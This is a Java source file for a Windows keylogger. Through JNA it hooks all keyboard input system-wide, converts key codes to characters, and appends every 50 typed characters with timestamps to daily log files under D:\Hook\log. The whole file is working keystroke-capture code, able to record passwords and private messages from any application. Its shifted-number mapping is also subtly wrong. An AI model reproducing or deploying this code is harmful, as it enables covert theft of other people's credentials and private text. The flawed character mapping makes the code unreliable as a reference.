package com.lushunde.hook;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinDef.LPARAM;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.HHOOK;
import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
import com.sun.jna.platform.win32.WinUser.MSG;


public class WindowsKeybordListener {
	
	// 默认文件记录输出地址 
	static String filePath = "D:\\Hook\\log";
	

    private static HHOOK hhkook;
    private static LowLevelKeyboardProc keyboardHook;
    static List<Character> singleInput = new ArrayList<Character>(); //输入字符code集合
    private static String text = ""; //输入字符值拼接
    private static Integer textCount = 0; // 記錄連接數 
    private static String caseCode() { //字符code集合转为字符值拼接
        StringBuffer buffer = new StringBuffer();
        for (Character i : singleInput) {
            buffer.append(i);
        }
        return buffer.toString();
    }

    public static void main(String[] args) {
    	
    	System.out.println("开始运行。。。");
    	
    	//创建默认文件夹
    	File Dir = new File(filePath);
    	if(!Dir.exists()) {
    		Dir.mkdirs();
    	}
    	
    	
        final User32 lib = User32.INSTANCE;
        HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        keyboardHook = new LowLevelKeyboardProc() {
            boolean isShiftUp = false;
            @Override
            public LRESULT callback(int nCode, WPARAM wParam, KBDLLHOOKSTRUCT info) {
                if (nCode >= 0) {
                    switch (wParam.intValue()) {
                        case WinUser.WM_KEYDOWN:// 只监听键盘按下
                            text = caseCode();
                            if (text.length() >= 50) { //输入字符超过50个即换行输出文件
                                
                                textCount = textCount + text.length();
                                
                                System.out.println("当前按键统计数为："+ textCount +"  输入内容为："+text );
                                singleInput.clear();
                                
                                Date date = new Date();
                                SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH-mm-ss");
                                String curTime = format.format(date);
                                File file = new File(filePath+"\\"+curTime.substring(0,10)+".txt");
                                try {
                                    if(!file.exists()) {
                                        file.createNewFile();
                                    }
                                } catch(IOException e){
                                    e.printStackTrace();
                                }

                                StringBuffer buffer = new StringBuffer("");
                                try {
                                    FileInputStream fileInputStream = new FileInputStream(file);
                                    InputStreamReader inputStreamReader = new InputStreamReader(fileInputStream);
                                    BufferedReader bufferedReader  = new BufferedReader(inputStreamReader);
                                    String line = bufferedReader.readLine();
                                    while(line!=null){
                                        buffer.append(line);
                                        buffer.append("\n");
                                        line = bufferedReader.readLine();
                                    }
                                    inputStreamReader.close();
                                    text = buffer + text +" -> "+textCount+" -> "+curTime;

                                    FileOutputStream fileOutputStream = new FileOutputStream(file);
                                    fileOutputStream.write(text.getBytes());
                                    fileOutputStream.close();
                                }catch (Exception e) {
                                    e.printStackTrace();
                                }
                                break;
                            }

                            // 按下的是shift键时，标记一下
                            if (info.vkCode == 160) {
                                isShiftUp = true;
                            }
                            if (!isShiftUp) {
                                if (info.vkCode >= 65 && info.vkCode <= 90) {// 字母键
                                    singleInput.add((char) (info.vkCode + 32));
                                } else if (info.vkCode >= 219 && info.vkCode <= 221) {// [\]
                                    singleInput.add((char) (info.vkCode - 128));
                                } else if (info.vkCode >= 188 && info.vkCode <= 191) {// ,-./
                                    singleInput.add((char) (info.vkCode - 144));
                                } else if (info.vkCode >= 48 && info.vkCode <= 57) {// 数字键
                                    singleInput.add((char) info.vkCode);
                                }
                                if (info.vkCode == 186) {
                                    singleInput.add(';');
                                }
                                if (info.vkCode == 187) {
                                    singleInput.add('=');
                                }
                                if (info.vkCode == 192) {
                                    singleInput.add('`');
                                }
                                if (info.vkCode == 222) {
                                    singleInput.add('\'');
                                }
                            } else {
                                // 大写字母
                                if (info.vkCode >= 65 && info.vkCode <= 90) {
                                    singleInput.add((char) info.vkCode);
                                }

                                switch (info.vkCode) {
                                    case 186:
                                        singleInput.add(':');
                                        break;
                                    case 187:
                                        singleInput.add('+');
                                        break;
                                    case 188:
                                        singleInput.add('<');
                                        break;
                                    case 189:
                                        singleInput.add('_');
                                        break;
                                    case 190:
                                        singleInput.add('>');
                                        break;
                                    case 191:
                                        singleInput.add('?');
                                        break;
                                    case 192:
                                        singleInput.add('~');
                                        break;
                                    case 219:
                                        singleInput.add('{');
                                        break;
                                    case 220:
                                        singleInput.add('|');
                                        break;
                                    case 221:
                                        singleInput.add('}');
                                        break;
                                    case 222:
                                        singleInput.add('\"');
                                        break;
                                    case 48:
                                        singleInput.add('!');
                                        break;
                                    case 50:
                                        singleInput.add('@');
                                        break;
                                    case 51:
                                        singleInput.add('#');
                                        break;
                                    case 52:
                                        singleInput.add('$');
                                        break;
                                    case 53:
                                        singleInput.add('%');
                                        break;
                                    case 54:
                                        singleInput.add('^');
                                        break;
                                    case 55:
                                        singleInput.add('&');
                                        break;
                                    case 56:
                                        singleInput.add('*');
                                        break;
                                    case 57:
                                        singleInput.add('(');
                                        break;
                                    case 58:
                                        singleInput.add(')');
                                        break;
                                }
                            }
                            break;
                        case WinUser.WM_KEYUP:// 按键起来
                            if (info.vkCode == 160) {
                                isShiftUp = false;
                            }
                            break;
                    }
                }
                Pointer ptr = info.getPointer();
                long peer = Pointer.nativeValue(ptr);
                return lib.CallNextHookEx(hhkook, nCode, wParam, new LPARAM(peer));
            }
        };
        hhkook = lib.SetWindowsHookEx(WinUser.WH_KEYBOARD_LL, keyboardHook, hMod, 0);

        // This bit never returns from GetMessage
        int result;
        MSG msg = new MSG();
        while ((result = lib.GetMessage(msg, null, 0, 0)) != 0) {
            if (result == -1) {
                // System.err.println("error in get message");
                break;
            } else {
                // System.err.println("got message");
                lib.TranslateMessage(msg);
                lib.DispatchMessage(msg);
            }
        }
        lib.UnhookWindowsHookEx(hhkook);
    }
}